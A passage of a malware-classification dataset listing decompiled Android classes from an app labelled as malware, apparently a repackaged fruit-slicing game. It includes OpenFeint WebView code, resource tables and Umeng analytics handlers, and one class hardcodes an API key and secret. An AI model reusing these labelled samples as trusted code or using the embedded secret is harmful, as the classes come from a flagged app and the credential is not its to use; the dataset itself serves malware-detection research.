"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.ui\WebNavChromeClient.code","private class WebNavChromeClient extends WebChromeClient {   private WebNavChromeClient(){   }   WebNavChromeClient(  WebNav webNav,  WebNavChromeClient webNavChromeClient){     this();   }   @Override public boolean onJsAlert(  WebView view,  String url,  String message,  final JsResult result){     new AlertDialog.Builder(view.getContext()).setMessage(message).setNegativeButton(OpenFeintInternal.getRString(R.string.of_ok),new DialogInterface.OnClickListener(){       @Override public void onClick(      DialogInterface dialog,      int which){         result.cancel();       }     } ).setOnCancelListener(new DialogInterface.OnCancelListener(){       @Override public void onCancel(      DialogInterface dialog){         result.cancel();       }     } ).show();     return true;   }   @Override public boolean onJsConfirm(  WebView view,  String url,  String message,  final JsResult result){     new AlertDialog.Builder(view.getContext()).setMessage(message).setPositiveButton(OpenFeintInternal.getRString(R.string.of_ok),new DialogInterface.OnClickListener(){       @Override public void onClick(      DialogInterface dialog,      int which){         result.confirm();       }     } ).setNegativeButton(OpenFeintInternal.getRString(R.string.of_cancel),new DialogInterface.OnClickListener(){       @Override public void onClick(      DialogInterface dialog,      int which){         result.cancel();       }     } ).setOnCancelListener(new DialogInterface.OnCancelListener(){       @Override public void onCancel(      DialogInterface dialog){         result.cancel();       }     } ).show();     return true;   }   @Override public void onConsoleMessage(  String message,  int lineNumber,  String sourceID){     if (!WebNav.this.mIsFrameworkLoaded) {       String line=String.format(""%s at %s:%d)"",message,sourceID,Integer.valueOf(lineNumber));       WebNav.this.mPreloadConsoleOutput.add(line);     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.ui\WebNavClient.code","public class WebNavClient extends WebViewClient {   ActionHandler mActionHandler;   public WebNavClient(  ActionHandler anActionHandler){     this.mActionHandler=anActionHandler;   }   @Override public boolean shouldOverrideUrlLoading(  WebView view,  String stringUrl){     Uri uri=Uri.parse(stringUrl);     if (uri.getScheme().equals(""http"") || uri.getScheme().equals(""https"")) {       view.loadUrl(stringUrl);       return true;     }     if (uri.getScheme().equals(""openfeint"")) {       this.mActionHandler.dispatch(uri);       return true;     }     OpenFeintInternal.log(WebNav.TAG,""UNHANDLED PROTOCOL: "" + uri.getScheme());     return true;   }   @Override public void onReceivedError(  WebView view,  int errorCode,  String description,  String failingUrl){     this.mActionHandler.hideLoader(null);   }   @Override public void onPageFinished(  WebView view,  String url){     if (!WebNav.this.mIsPageLoaded) {       WebNav.this.mIsPageLoaded=true;       if (WebNav.this.mIsFrameworkLoaded) {         loadInitialContent();       }  else {         attemptRecovery(view,url);       }     }   }   protected void attemptRecovery(  WebView view,  String url){     if (WebViewCache.recover()) {       WebNav.this.load(true);       new AlertDialog.Builder(view.getContext()).setMessage(OpenFeintInternal.getRString(R.string.of_crash_report_query)).setNegativeButton(OpenFeintInternal.getRString(R.string.of_no),new DialogInterface.OnClickListener(){         @Override public void onClick(        DialogInterface dialog,        int which){           WebNav.this.finish();         }       } ).setPositiveButton(OpenFeintInternal.getRString(R.string.of_yes),new DialogInterface.OnClickListener(){         @Override public void onClick(        DialogInterface dialog,        int which){           WebNavClient.this.submitCrashReport();         }       } ).show();     }  else     if (!WebViewCache.isDiskError()) {       WebNav.this.finish();     }   }   protected void submitCrashReport(){     Map<String,Object> crashReport=new HashMap<>();     crashReport.put(""console"",new JSONArray((Collection)WebNav.this.mPreloadConsoleOutput));     JSONObject json=new JSONObject(crashReport);     Map<String,Object> params=new HashMap<>();     params.put(""crash_report"",json.toString());     OpenFeintInternal.genericRequest(""/webui/crash_report"",""POST"",params,null,null);   }   public void loadInitialContent(){     OpenFeintInternal of=OpenFeintInternal.getInstance();     User localUser=of.getCurrentUser();     int orientation=WebNav.this.getResources().getConfiguration().orientation;     HashMap<String,Object> user=new HashMap<>();     if (localUser != null) {       user.put(""id"",localUser.resourceID());       user.put(""name"",localUser.name);     }     HashMap<String,Object> game=new HashMap<>();     game.put(""id"",of.getAppID());     game.put(""name"",of.getAppName());     game.put(""version"",Integer.toString(of.getAppVersion()));     Map<String,Object> device=OpenFeintInternal.getInstance().getDeviceParams();     HashMap<String,Object> config=new HashMap<>();     config.put(""platform"",""android"");     config.put(""clientVersion"",of.getOFVersion());     config.put(""hasNativeInterface"",true);     config.put(""dpi"",Util.getDpiName(WebNav.this));     config.put(""locale"",WebNav.this.getResources().getConfiguration().locale.toString());     config.put(""user"",new JSONObject(user));     config.put(""game"",new JSONObject(game));     config.put(""device"",new JSONObject(device));     config.put(""actions"",new JSONArray((Collection)WebNav.this.getActionHandler().getActionList()));     config.put(""orientation"",orientation == 2 ? ""landscape"" : ""portrait"");     config.put(""serverUrl"",of.getServerUrl());     JSONObject json=new JSONObject(config);     WebNav.this.executeJavascript(String.format(""OF.init.clientBoot(%s)"",json.toString()));     this.mActionHandler.mWebNav.loadInitialContent();   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.ui\WebViewCache.code","!org.eclipse.jdt.core.dom.TypeDeclaration@23968461"
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.ui\WebViewCacheCallback.code","public abstract class WebViewCacheCallback {   public abstract void failLoaded();   public abstract void pathLoaded(  String str);   public void onTrackingNeeded(){   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.panda.panzdfdgfhghad\attr.code","public static final class attr { } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.panda.panzdfdgfhghad\color.code","public static final class color {   public static final int of_transparent=0x7f050000; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.panda.panzdfdgfhghad\drawable.code","public static final class drawable {   public static final int frame_layout_shape=0x7f020000;   public static final int icon=0x7f020001;   public static final int of_achievement_icon_frame=0x7f020002;   public static final int of_achievement_icon_locked=0x7f020003;   public static final int of_achievement_icon_unlocked=0x7f020004;   public static final int of_achievement_notification_bkg=0x7f020005;   public static final int of_achievement_notification_locked=0x7f020006;   public static final int of_feint_points_white=0x7f020007;   public static final int of_icon_dashboard_exit=0x7f020008;   public static final int of_icon_dashboard_home=0x7f020009;   public static final int of_icon_dashboard_settings=0x7f02000a;   public static final int of_icon_highscore_notification=0x7f02000b;   public static final int of_ll_logo=0x7f02000c;   public static final int of_native_loader=0x7f02000d;   public static final int of_native_loader_frame=0x7f02000e;   public static final int of_native_loader_leaf=0x7f02000f;   public static final int of_native_loader_progress=0x7f020010;   public static final int of_native_loader_progress_01=0x7f020011;   public static final int of_native_loader_progress_02=0x7f020012;   public static final int of_native_loader_progress_03=0x7f020013;   public static final int of_native_loader_progress_04=0x7f020014;   public static final int of_native_loader_progress_05=0x7f020015;   public static final int of_native_loader_progress_06=0x7f020016;   public static final int of_native_loader_progress_07=0x7f020017;   public static final int of_native_loader_progress_08=0x7f020018;   public static final int of_native_loader_progress_09=0x7f020019;   public static final int of_native_loader_progress_10=0x7f02001a;   public static final int of_native_loader_progress_11=0x7f02001b;   public static final int of_native_loader_progress_12=0x7f02001c;   public static final int of_notification_bkg=0x7f02001d; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.panda.panzdfdgfhghad\id.code","public static final class id {   public static final int adsview=0x7f090001;   public static final int appIcon=0x7f090012;   public static final int exit_feint=0x7f090018;   public static final int frameLayout=0x7f09000b;   public static final int home=0x7f090016;   public static final int layout_main=0x7f090000;   public static final int nested_window_root=0x7f09000a;   public static final int of_achievement_icon=0x7f090003;   public static final int of_achievement_icon_frame=0x7f090004;   public static final int of_achievement_notification=0x7f090002;   public static final int of_achievement_progress_icon=0x7f090008;   public static final int of_achievement_score=0x7f090006;   public static final int of_achievement_score_icon=0x7f090007;   public static final int of_achievement_text=0x7f090005;   public static final int of_icon=0x7f09000e;   public static final int of_ll_logo_image=0x7f09000d;   public static final int of_text=0x7f09000f;   public static final int of_text1=0x7f090010;   public static final int of_text2=0x7f090011;   public static final int progress=0x7f090009;   public static final int progress_bar=0x7f090015;   public static final int progress_text=0x7f090013;   public static final int settings=0x7f090017;   public static final int title=0x7f090014;   public static final int web_view=0x7f09000c;   public static final int noti_icon=0x7f090019;   public static final int noti_time=0x7f09001a;   public static final int noti_title=0x7f09001b;   public static final int noti_content=0x7f09001c; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.panda.panzdfdgfhghad\layout.code","public static final class layout {   public static final int main=0x7f030000;   public static final int of_achievement_notification=0x7f030001;   public static final int of_native_loader=0x7f030002;   public static final int of_nested_window=0x7f030003;   public static final int of_simple_notification=0x7f030004;   public static final int of_two_line_notification=0x7f030005;   public static final int status_bar_ongoing_event_progress_bar=0x7f030006;   public static final int layout_notification=0x7f030007; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.panda.panzdfdgfhghad\menu.code","public static final class menu {   public static final int of_dashboard=0x7f080000; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.panda.panzdfdgfhghad\OpenFeintApplication.code","public class OpenFeintApplication extends Application {   private static final String gameID=""336482"";   private static final String gameKey=""fZrbnZQPhMja1nKG7TH0A"";   private static final String gameName=""Panda Slice"";   private static final String gameSecret=""tReQrg1P4EkZh2eL5v6c6tZz3wmyb5MhzwzhVCQo"";   public static List<Achievement> achievements=null;   public static List<Leaderboard> leaderboards=null;   @Override public void onCreate(){     super.onCreate();     Map<String,Object> options=new HashMap<>();     options.put(OpenFeintSettings.SettingCloudStorageCompressionStrategy,OpenFeintSettings.CloudStorageCompressionStrategyDefault);     OpenFeintSettings settings=new OpenFeintSettings(gameName,gameKey,gameSecret,gameID,options);     OpenFeint.initialize(this,settings,new OpenFeintDelegate(){     } );     Achievement.list(new Achievement.ListCB(){       @Override public void onSuccess(      List<Achievement> _achievements){         OpenFeintApplication.achievements=_achievements;       }     } );     Leaderboard.list(new Leaderboard.ListCB(){       @Override public void onSuccess(      List<Leaderboard> _leaderboards){         OpenFeintApplication.leaderboards=_leaderboards;       }     } );   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.panda.panzdfdgfhghad\R.code","public final class R { public static final class attr {   } public static final class color {     public static final int of_transparent=0x7f050000;   } public static final class drawable {     public static final int frame_layout_shape=0x7f020000;     public static final int icon=0x7f020001;     public static final int of_achievement_icon_frame=0x7f020002;     public static final int of_achievement_icon_locked=0x7f020003;     public static final int of_achievement_icon_unlocked=0x7f020004;     public static final int of_achievement_notification_bkg=0x7f020005;     public static final int of_achievement_notification_locked=0x7f020006;     public static final int of_feint_points_white=0x7f020007;     public static final int of_icon_dashboard_exit=0x7f020008;     public static final int of_icon_dashboard_home=0x7f020009;     public static final int of_icon_dashboard_settings=0x7f02000a;     public static final int of_icon_highscore_notification=0x7f02000b;     public static final int of_ll_logo=0x7f02000c;     public static final int of_native_loader=0x7f02000d;     public static final int of_native_loader_frame=0x7f02000e;     public static final int of_native_loader_leaf=0x7f02000f;     public static final int of_native_loader_progress=0x7f020010;     public static final int of_native_loader_progress_01=0x7f020011;     public static final int of_native_loader_progress_02=0x7f020012;     public static final int of_native_loader_progress_03=0x7f020013;     public static final int of_native_loader_progress_04=0x7f020014;     public static final int of_native_loader_progress_05=0x7f020015;     public static final int of_native_loader_progress_06=0x7f020016;     public static final int of_native_loader_progress_07=0x7f020017;     public static final int of_native_loader_progress_08=0x7f020018;     public static final int of_native_loader_progress_09=0x7f020019;     public static final int of_native_loader_progress_10=0x7f02001a;     public static final int of_native_loader_progress_11=0x7f02001b;     public static final int of_native_loader_progress_12=0x7f02001c;     public static final int of_notification_bkg=0x7f02001d;   } public static final class id {     public static final int adsview=0x7f090001;     public static final int appIcon=0x7f090012;     public static final int exit_feint=0x7f090018;     public static final int frameLayout=0x7f09000b;     public static final int home=0x7f090016;     public static final int layout_main=0x7f090000;     public static final int nested_window_root=0x7f09000a;     public static final int of_achievement_icon=0x7f090003;     public static final int of_achievement_icon_frame=0x7f090004;     public static final int of_achievement_notification=0x7f090002;     public static final int of_achievement_progress_icon=0x7f090008;     public static final int of_achievement_score=0x7f090006;     public static final int of_achievement_score_icon=0x7f090007;     public static final int of_achievement_text=0x7f090005;     public static final int of_icon=0x7f09000e;     public static final int of_ll_logo_image=0x7f09000d;     public static final int of_text=0x7f09000f;     public static final int of_text1=0x7f090010;     public static final int of_text2=0x7f090011;     public static final int progress=0x7f090009;     public static final int progress_bar=0x7f090015;     public static final int progress_text=0x7f090013;     public static final int settings=0x7f090017;     public static final int title=0x7f090014;     public static final int web_view=0x7f09000c;     public static final int noti_icon=0x7f090019;     public static final int noti_time=0x7f09001a;     public static final int noti_title=0x7f09001b;     public static final int noti_content=0x7f09001c;   } public static final class layout {     public static final int main=0x7f030000;     public static final int of_achievement_notification=0x7f030001;     public static final int of_native_loader=0x7f030002;     public static final int of_nested_window=0x7f030003;     public static final int of_simple_notification=0x7f030004;     public static final int of_two_line_notification=0x7f030005;     public static final int status_bar_ongoing_event_progress_bar=0x7f030006;     public static final int layout_notification=0x7f030007;   } public static final class menu {     public static final int of_dashboard=0x7f080000;   } public static final class raw {     public static final int banana0=0x7f040000;     public static final int banana1=0x7f040001;     public static final int banana1_1=0x7f040002;     public static final int banana1_2=0x7f040003;     public static final int banana2=0x7f040004;     public static final int banana2_1=0x7f040005;     public static final int banana2_2=0x7f040006;     public static final int bgmusic_forest=0x7f040007;     public static final int bgmusic_menue=0x7f040008;     public static final int bomb=0x7f040009;     public static final int cantaloupe0=0x7f04000a;     public static final int cantaloupe1=0x7f04000b;     public static final int cantaloupe1_1=0x7f04000c;     public static final int cantaloupe1_2=0x7f04000d;     public static final int cantaloupe2=0x7f04000e;     public static final int cantaloupe2_1=0x7f04000f;     public static final int cantaloupe2_2=0x7f040010;     public static final int carambola0=0x7f040011;     public static final int carambola1=0x7f040012;     public static final int carambola1_1=0x7f040013;     public static final int carambola1_2=0x7f040014;     public static final int carambola2=0x7f040015;     public static final int carambola2_1=0x7f040016;     public static final int carambola2_2=0x7f040017;     public static final int coconut0=0x7f040018;     public static final int coconut1=0x7f040019;     public static final int coconut1_1=0x7f04001a;     public static final int coconut1_2=0x7f04001b;     public static final int coconut2=0x7f04001c;     public static final int coconut2_1=0x7f04001d;     public static final int coconut2_2=0x7f04001e;     public static final int combo=0x7f04001f;     public static final int critical=0x7f040020;     public static final int cut_up=0x7f040021;     public static final int hit_bomb=0x7f040022;     public static final int kaka=0x7f040023;     public static final int l1_2=0x7f040024;     public static final int l2_3=0x7f040025;     public static final int l3_4=0x7f040026;     public static final int lemon0=0x7f040027;     public static final int lemon1=0x7f040028;     public static final int lemon1_1=0x7f040029;     public static final int lemon1_2=0x7f04002a;     public static final int lemon2=0x7f04002b;     public static final int lemon2_1=0x7f04002c;     public static final int lemon2_2=0x7f04002d;     public static final int lighting_fruit=0x7f04002e;     public static final int mangosteen0=0x7f04002f;     public static final int mangosteen1=0x7f040030;     public static final int mangosteen1_1=0x7f040031;     public static final int mangosteen1_2=0x7f040032;     public static final int mangosteen2=0x7f040033;     public static final int mangosteen2_1=0x7f040034;     public static final int mangosteen2_2=0x7f040035;     public static final int orange0=0x7f040036;     public static final int orange1=0x7f040037;     public static final int orange1_1=0x7f040038;     public static final int orange1_2=0x7f040039;     public static final int orange2=0x7f04003a;     public static final int orange2_1=0x7f04003b;     public static final int orange2_2=0x7f04003c;     public static final int papaya0=0x7f04003d;     public static final int papaya1=0x7f04003e;     public static final int papaya1_1=0x7f04003f;     public static final int papaya1_2=0x7f040040;     public static final int papaya2=0x7f040041;     public static final int papaya2_1=0x7f040042;     public static final int papaya2_2=0x7f040043;     public static final int peach0=0x7f040044;     public static final int peach1=0x7f040045;     public static final int peach1_1=0x7f040046;     public static final int peach1_2=0x7f040047;     public static final int peach2=0x7f040048;     public static final int peach2_1=0x7f040049;     public static final int peach2_2=0x7f04004a;     public static final int pineapple0=0x7f04004b;     public static final int pineapple1=0x7f04004c;     public static final int pineapple1_1=0x7f04004d;     public static final int pineapple1_2=0x7f04004e;     public static final int pineapple2=0x7f04004f;     public static final int pineapple2_1=0x7f040050;     public static final int pineapple2_2=0x7f040051;     public static final int stone=0x7f040052;     public static final int sword_ninjia=0x7f040053;     public static final int time_count_down=0x7f040054;     public static final int time_up=0x7f040055;     public static final int tomato0=0x7f040056;     public static final int tomato1=0x7f040057;     public static final int tomato1_1=0x7f040058;     public static final int tomato1_2=0x7f040059;     public static final int tomato2=0x7f04005a;     public static final int tomato2_1=0x7f04005b;     public static final int tomato2_2=0x7f04005c;     public static final int watermelon0=0x7f04005d;     public static final int watermelon1=0x7f04005e;     public static final int watermelon1_1=0x7f04005f;     public static final int watermelon1_2=0x7f040060;     public static final int watermelon2=0x7f040061;     public static final int watermelon2_1=0x7f040062;     public static final int watermelon2_2=0x7f040063;   } public static final class string {     public static final int app_name=0x7f060034;     public static final int continue_use=0x7f060031;     public static final int of_achievement_load_null=0x7f060008;     public static final int of_achievement_unlock_null=0x7f060007;     public static final int of_achievement_unlocked=0x7f060017;     public static final int of_banned_dialog=0x7f060024;     public static final int of_bitmap_decode_error=0x7f060019;     public static final int of_cancel=0x7f060013;     public static final int of_cant_compress_blob=0x7f060015;     public static final int of_crash_report_query=0x7f060021;     public static final int of_device=0x7f06000e;     public static final int of_error_parsing_error_message=0x7f06001b;     public static final int of_exit_feint=0x7f060026;     public static final int of_file_not_found=0x7f06001a;     public static final int of_home=0x7f060023;     public static final int of_id_cannot_be_null=0x7f060002;     public static final int of_io_exception_on_download=0x7f060014;     public static final int of_ioexception_reading_body=0x7f06001d;     public static final int of_key_cannot_be_null=0x7f060000;     public static final int of_loading_feint=0x7f06000f;     public static final int of_low_memory_profile_pic=0x7f06000a;     public static final int of_malformed_request_error=0x7f06002a;     public static final int of_name_cannot_be_null=0x7f060003;     public static final int of_no=0x7f060010;     public static final int of_no_blob=0x7f060016;     public static final int of_no_video=0x7f060022;     public static final int of_nodisk=0x7f06000c;     public static final int of_now_logged_in_as_format=0x7f06001f;     public static final int of_null_icon_url=0x7f060006;     public static final int of_offline_notification=0x7f060027;     public static final int of_offline_notification_line2=0x7f060028;     public static final int of_ok=0x7f060012;     public static final int of_profile_pic_changed=0x7f060020;     public static final int of_profile_picture_download_failed=0x7f06000b;     public static final int of_profile_url_null=0x7f060009;     public static final int of_score_submitted_notification=0x7f060029;     public static final int of_sdcard=0x7f06000d;     public static final int of_secret_cannot_be_null=0x7f060001;     public static final int of_server_error_code_format=0x7f06001c;     public static final int of_settings=0x7f060025;     public static final int of_switched_accounts=0x7f06001e;     public static final int of_timeout=0x7f060018;     public static final int of_unexpected_response_format=0x7f060004;     public static final int of_unknown_server_error=0x7f060005;     public static final int of_yes=0x7f060011;     public static final int resource_begin_download_entry=0x7f06002d;     public static final int resource_begin_download_package=0x7f06002f;     public static final int resource_end_download_entry=0x7f06002c;     public static final int resource_end_download_package=0x7f06002e;     public static final int resource_finish_checking=0x7f06002b;     public static final int resource_start_checking=0x7f060030;     public static final int warning=0x7f060032;     public static final int warning_message=0x7f060033;   } public static final class style {     public static final int FullScreenAds=0x7f070002;     public static final int OFLoading=0x7f070000;     public static final int OFNestedWindow=0x7f070001;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.panda.panzdfdgfhghad\raw.code","public static final class raw {   public static final int banana0=0x7f040000;   public static final int banana1=0x7f040001;   public static final int banana1_1=0x7f040002;   public static final int banana1_2=0x7f040003;   public static final int banana2=0x7f040004;   public static final int banana2_1=0x7f040005;   public static final int banana2_2=0x7f040006;   public static final int bgmusic_forest=0x7f040007;   public static final int bgmusic_menue=0x7f040008;   public static final int bomb=0x7f040009;   public static final int cantaloupe0=0x7f04000a;   public static final int cantaloupe1=0x7f04000b;   public static final int cantaloupe1_1=0x7f04000c;   public static final int cantaloupe1_2=0x7f04000d;   public static final int cantaloupe2=0x7f04000e;   public static final int cantaloupe2_1=0x7f04000f;   public static final int cantaloupe2_2=0x7f040010;   public static final int carambola0=0x7f040011;   public static final int carambola1=0x7f040012;   public static final int carambola1_1=0x7f040013;   public static final int carambola1_2=0x7f040014;   public static final int carambola2=0x7f040015;   public static final int carambola2_1=0x7f040016;   public static final int carambola2_2=0x7f040017;   public static final int coconut0=0x7f040018;   public static final int coconut1=0x7f040019;   public static final int coconut1_1=0x7f04001a;   public static final int coconut1_2=0x7f04001b;   public static final int coconut2=0x7f04001c;   public static final int coconut2_1=0x7f04001d;   public static final int coconut2_2=0x7f04001e;   public static final int combo=0x7f04001f;   public static final int critical=0x7f040020;   public static final int cut_up=0x7f040021;   public static final int hit_bomb=0x7f040022;   public static final int kaka=0x7f040023;   public static final int l1_2=0x7f040024;   public static final int l2_3=0x7f040025;   public static final int l3_4=0x7f040026;   public static final int lemon0=0x7f040027;   public static final int lemon1=0x7f040028;   public static final int lemon1_1=0x7f040029;   public static final int lemon1_2=0x7f04002a;   public static final int lemon2=0x7f04002b;   public static final int lemon2_1=0x7f04002c;   public static final int lemon2_2=0x7f04002d;   public static final int lighting_fruit=0x7f04002e;   public static final int mangosteen0=0x7f04002f;   public static final int mangosteen1=0x7f040030;   public static final int mangosteen1_1=0x7f040031;   public static final int mangosteen1_2=0x7f040032;   public static final int mangosteen2=0x7f040033;   public static final int mangosteen2_1=0x7f040034;   public static final int mangosteen2_2=0x7f040035;   public static final int orange0=0x7f040036;   public static final int orange1=0x7f040037;   public static final int orange1_1=0x7f040038;   public static final int orange1_2=0x7f040039;   public static final int orange2=0x7f04003a;   public static final int orange2_1=0x7f04003b;   public static final int orange2_2=0x7f04003c;   public static final int papaya0=0x7f04003d;   public static final int papaya1=0x7f04003e;   public static final int papaya1_1=0x7f04003f;   public static final int papaya1_2=0x7f040040;   public static final int papaya2=0x7f040041;   public static final int papaya2_1=0x7f040042;   public static final int papaya2_2=0x7f040043;   public static final int peach0=0x7f040044;   public static final int peach1=0x7f040045;   public static final int peach1_1=0x7f040046;   public static final int peach1_2=0x7f040047;   public static final int peach2=0x7f040048;   public static final int peach2_1=0x7f040049;   public static final int peach2_2=0x7f04004a;   public static final int pineapple0=0x7f04004b;   public static final int pineapple1=0x7f04004c;   public static final int pineapple1_1=0x7f04004d;   public static final int pineapple1_2=0x7f04004e;   public static final int pineapple2=0x7f04004f;   public static final int pineapple2_1=0x7f040050;   public static final int pineapple2_2=0x7f040051;   public static final int stone=0x7f040052;   public static final int sword_ninjia=0x7f040053;   public static final int time_count_down=0x7f040054;   public static final int time_up=0x7f040055;   public static final int tomato0=0x7f040056;   public static final int tomato1=0x7f040057;   public static final int tomato1_1=0x7f040058;   public static final int tomato1_2=0x7f040059;   public static final int tomato2=0x7f04005a;   public static final int tomato2_1=0x7f04005b;   public static final int tomato2_2=0x7f04005c;   public static final int watermelon0=0x7f04005d;   public static final int watermelon1=0x7f04005e;   public static final int watermelon1_1=0x7f04005f;   public static final int watermelon1_2=0x7f040060;   public static final int watermelon2=0x7f040061;   public static final int watermelon2_1=0x7f040062;   public static final int watermelon2_2=0x7f040063; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.panda.panzdfdgfhghad\StartActivity.code","public class StartActivity extends Activity {   public static Context context;   @Override protected void onCreate(  Bundle savedInstanceState){     super.onCreate(savedInstanceState);     context=this;     Intent gameIntent=new Intent(this,(Class<?>)FruitNinjiaGL1Activity.class);     startActivity(gameIntent);     finish();   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.panda.panzdfdgfhghad\string.code","public static final class string {   public static final int app_name=0x7f060034;   public static final int continue_use=0x7f060031;   public static final int of_achievement_load_null=0x7f060008;   public static final int of_achievement_unlock_null=0x7f060007;   public static final int of_achievement_unlocked=0x7f060017;   public static final int of_banned_dialog=0x7f060024;   public static final int of_bitmap_decode_error=0x7f060019;   public static final int of_cancel=0x7f060013;   public static final int of_cant_compress_blob=0x7f060015;   public static final int of_crash_report_query=0x7f060021;   public static final int of_device=0x7f06000e;   public static final int of_error_parsing_error_message=0x7f06001b;   public static final int of_exit_feint=0x7f060026;   public static final int of_file_not_found=0x7f06001a;   public static final int of_home=0x7f060023;   public static final int of_id_cannot_be_null=0x7f060002;   public static final int of_io_exception_on_download=0x7f060014;   public static final int of_ioexception_reading_body=0x7f06001d;   public static final int of_key_cannot_be_null=0x7f060000;   public static final int of_loading_feint=0x7f06000f;   public static final int of_low_memory_profile_pic=0x7f06000a;   public static final int of_malformed_request_error=0x7f06002a;   public static final int of_name_cannot_be_null=0x7f060003;   public static final int of_no=0x7f060010;   public static final int of_no_blob=0x7f060016;   public static final int of_no_video=0x7f060022;   public static final int of_nodisk=0x7f06000c;   public static final int of_now_logged_in_as_format=0x7f06001f;   public static final int of_null_icon_url=0x7f060006;   public static final int of_offline_notification=0x7f060027;   public static final int of_offline_notification_line2=0x7f060028;   public static final int of_ok=0x7f060012;   public static final int of_profile_pic_changed=0x7f060020;   public static final int of_profile_picture_download_failed=0x7f06000b;   public static final int of_profile_url_null=0x7f060009;   public static final int of_score_submitted_notification=0x7f060029;   public static final int of_sdcard=0x7f06000d;   public static final int of_secret_cannot_be_null=0x7f060001;   public static final int of_server_error_code_format=0x7f06001c;   public static final int of_settings=0x7f060025;   public static final int of_switched_accounts=0x7f06001e;   public static final int of_timeout=0x7f060018;   public static final int of_unexpected_response_format=0x7f060004;   public static final int of_unknown_server_error=0x7f060005;   public static final int of_yes=0x7f060011;   public static final int resource_begin_download_entry=0x7f06002d;   public static final int resource_begin_download_package=0x7f06002f;   public static final int resource_end_download_entry=0x7f06002c;   public static final int resource_end_download_package=0x7f06002e;   public static final int resource_finish_checking=0x7f06002b;   public static final int resource_start_checking=0x7f060030;   public static final int warning=0x7f060032;   public static final int warning_message=0x7f060033; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.panda.panzdfdgfhghad\style.code","public static final class style {   public static final int FullScreenAds=0x7f070002;   public static final int OFLoading=0x7f070000;   public static final int OFNestedWindow=0x7f070001; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics\a.code","class a implements Thread.UncaughtExceptionHandler {   private Thread.UncaughtExceptionHandler a;   private i b;   private Context c;   public void a(  Context context){     if (Thread.getDefaultUncaughtExceptionHandler() != this) {       this.c=context.getApplicationContext();       this.a=Thread.getDefaultUncaughtExceptionHandler();       Thread.setDefaultUncaughtExceptionHandler(this);     }   }   public void a(  i iVar){     this.b=iVar;   }   @Override public void uncaughtException(  Thread thread,  Throwable th){     a(th);     if (this.a != null) {       this.a.uncaughtException(thread,th);     }   }   private void a(  Throwable th){     if (th == null) {       Log.e(g.q,""Exception is null in handleException"");     }  else {       this.b.b(this.c,th);     }   } } public final class a implements Runnable {   private final Object b=new Object();   private Context c;   private int d;   a(  Context context,  int i){     this.c=context.getApplicationContext();     this.d=i;   }   @Override public void run(){     try { synchronized (this.b) { switch (this.d) { case DownloadingService.g:           b.this.j(this.c);         break; case 1:       b.this.i(this.c);     break; } } }  catch (Exception e) { Log.b(g.q,""Exception occurred in invokehander."",e); } } } public final class a implements Runnable {   private Context b;   a(  Context context){     this.b=context.getApplicationContext();   }   @Override public void run(){     try { synchronized (d.this.b) {         d.this.d.a(this.b);       }     }  catch (    Error e) {       Log.b(g.q,""Error : "" + e.getMessage());       try {         j.j(this.b);       }  catch (      Exception e2) {         e2.printStackTrace();       }     } catch (    Exception e3) {       Log.b(g.q,""Exception occurred in ReportMessageHandler"",e3);     }   } } final class a extends WebChromeClient {   WebChromeClient a;   private final String c=""ekv"";   private final String d=""event"";   public a(  WebChromeClient webChromeClient){     this.a=null;     if (webChromeClient == null) {       this.a=new WebChromeClient();     }  else {       this.a=webChromeClient;     }   }   @Override public boolean onJsPrompt(  WebView webView,  String str,  String str2,  String str3,  JsPromptResult jsPromptResult){     if (""ekv"".equals(str2)) {       try {         JSONObject jSONObject=new JSONObject(str3);         HashMap<String,String> hashMap=new HashMap<>();         String str4=(String)jSONObject.remove(""id"");         int intValue=jSONObject.isNull(""duration"") ? 0 : ((Integer)jSONObject.remove(""duration"")).intValue();         Iterator<String> keys=jSONObject.keys();         while (keys.hasNext()) {           String next=keys.next();           hashMap.put(next,jSONObject.getString(next));         }         MobclickAgent.a().a(MobclickAgentJSInterface.this.a,str4,hashMap,intValue);       }  catch (      Exception e) {         e.printStackTrace();       }     }  else     if (""event"".equals(str2)) {       try {         JSONObject jSONObject2=new JSONObject(str3);         String optString=jSONObject2.optString(""label"");         if ("""".equals(optString)) {           optString=null;         }         MobclickAgent.a().a(MobclickAgentJSInterface.this.a,jSONObject2.getString(""tag""),optString,jSONObject2.optInt(""duration""),1);       }  catch (      Exception e2) {       }     }  else {       return this.a.onJsPrompt(webView,str,str2,str3,jsPromptResult);     }     jsPromptResult.confirm();     return true;   }   @Override public void 